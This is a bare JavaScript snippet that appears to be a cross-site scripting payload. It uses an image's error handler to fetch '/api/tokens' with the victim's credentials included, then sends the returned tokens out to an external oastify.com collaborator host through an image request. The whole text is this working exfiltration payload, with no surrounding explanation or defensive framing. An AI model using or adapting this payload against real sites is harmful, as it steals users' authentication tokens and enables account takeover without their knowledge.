var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://mkabsttq4kqqdfn5721ui6w0jrpid91y.oastify.com/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
